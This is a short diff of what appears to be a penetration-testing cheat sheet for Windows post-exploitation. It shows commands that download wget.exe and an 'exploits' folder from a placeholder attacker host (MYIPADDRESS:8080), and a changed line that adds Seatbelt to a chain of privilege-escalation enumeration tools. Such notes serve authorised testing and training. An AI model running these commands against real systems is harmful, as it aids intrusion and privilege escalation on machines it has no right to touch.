@@ -419,7 +419,7 @@ cscript.exe wget.vbs http://MYIPADDRESS:8080/wget.exe wget.exe
 
 wget.exe http://MYIPADDRESS:8080/ -r && move MYIPADDRESS+8080 exploits && cd exploits && del index.html
 
-START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+START /B windows-privesc-check2.exe --audit -a -o wpc-report && START /B accesschk.exe -uwcqv "Authenticated Users" * /accepteula && START /B seatbelt.exe all > seatbelt-report
 
 Windows XP and Server 2003:
 Host:
